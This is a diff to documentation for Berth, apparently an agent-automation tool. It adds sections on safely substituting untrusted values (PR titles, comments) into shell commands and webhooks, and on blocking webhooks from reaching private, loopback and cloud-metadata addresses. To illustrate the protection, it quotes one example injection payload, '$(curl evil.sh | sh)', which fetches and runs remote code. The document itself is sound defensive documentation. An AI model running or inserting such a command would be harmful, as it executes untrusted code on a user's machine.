@@ -154,7 +154,7 @@ poll makes at most 20 `gh` calls, shared between flows.
 | `wait` | Waits for that agent's turn to end | `for` (a list: `["finished"]`, `["waiting"]`; default both), `session`, `timeout` (30m) |
 | `start_agent` | Starts an agent in the worktree, or in a new one | `agent`, `text` (its prompt), `new_worktree`, `name` |
 | `notify` | Shows a notification in the app | `title`, `text` |
-| `webhook` | POSTs JSON somewhere, e.g. Slack | `url`, `text` (the body; default every variable), `timeout` (15s) |
+| `webhook` | POSTs JSON to a public address, e.g. Slack | `url`, `text` (the body; default every variable), `timeout` (15s) |
 
 - Each step runs when the previous one succeeded (`when: "success"`, the
   default), failed (`"failure"`), or `"always"`.
@@ -181,6 +181,38 @@ Text fields take:
 
 Output is the last 4000 characters. An unknown variable is empty.
 
+### How values are filled in
+
+A variable's value can come from someone else: a PR's title, a review
+comment, a branch name, or whatever an earlier step printed. Berth fills it
+in so that it is always just text, never part of a command:
+
+- **`run` commands never contain a value.** Every variable is in the
+  command's environment as `BERTH_FLOW_` and its name in capitals, dots and
+  dashes as `_` (`{{event.body}}` is `$BERTH_FLOW_EVENT_BODY`,
+  `{{steps.test.output}}` is `$BERTH_FLOW_STEPS_TEST_OUTPUT`), and
+  `{{event.body}}` in a command becomes a quoted reference to it. Write it
+  bare, in double quotes or in single quotes; each gives the value as one
+  argument, exactly:
+
+  ```sh
+  gh pr comment {{event.pr}} --body "Thanks {{event.author}}: {{event.body}}"
+  ```
+
+  A comment of `$(curl evil.sh | sh)` is posted as those characters, not
+  run. In a here-document, or anywhere the shell would not expand a
+  variable, use `$BERTH_FLOW_…` yourself. Don't pass a variable to `eval`
+  or `sh -c`: that would run it.
+- **Webhook URLs** get each value percent-encoded, so a value cannot add a
+  path, a query parameter or a host.
+- **Webhook bodies** get each value JSON-escaped inside a string, and
+  outside one as a number if it is one, else a string, so a value cannot add
+  fields.
+- **Prompts, notifications and names** get the text as it is.
+- **Secrets** from the worktree's environment (`op://`, `env://`) are never
+  sent: a secret's value in a webhook's URL or body, a notification, or a
+  step's kept output becomes `[secret]`.
+
 ## Safety
 
 - A flow that is already running for a worktree is not started again for it.
@@ -189,9 +221,34 @@ Output is the last 4000 characters. An unknown variable is empty.
   otherwise run forever.
 - Events a flow causes carry `origin: "flow:<id>"`, and `flow.started` and
   `flow.finished` never start flows.
+- Webhooks only reach public addresses (below).
 - `before:` gates check requests to the box's API, so they apply to Berth
   commands a `run` step runs (`berthd session send`, `berthd exec`, …). A
   flow's own `prompt` and `start_agent` steps don't go through them.
+
+### Outbound requests
+
+A webhook's URL can come from a repository's committed config, and its host
+from event data, so a webhook could otherwise make the box call its own
+services, the cloud's metadata endpoint, or the network it sits on. The box
+refuses to connect to loopback, private (`10/8`, `172.16/12`, `192.168/16`,
+`fc00::/7`), link-local and metadata (`169.254/16`, `fe80::/10`),
+carrier-grade NAT and tailnet (`100.64/10`), multicast and other reserved
+addresses. The check is made on the address actually dialled, after DNS and
+for every redirect (at most three), and proxy settings are ignored. A refused
+webhook fails its step with `refusing to connect to a private … address`.
+
+To allow a destination, list it in `~/.berth/network.json` on the box. Only
+someone on the box can write this file; nothing in the API or a repository
+changes it.
+
+```json
+{ "allow_outbound": ["10.0.0.0/8", "192.168.1.20", "hooks.internal.example"] }
+```
+
+An entry is an IP address, a CIDR prefix, or a host name; a host name is
+trusted whatever it resolves to. The same list applies to
+[phone notifications](/guides/phone), which also allow the tailnet.
 
 ## Runs
 
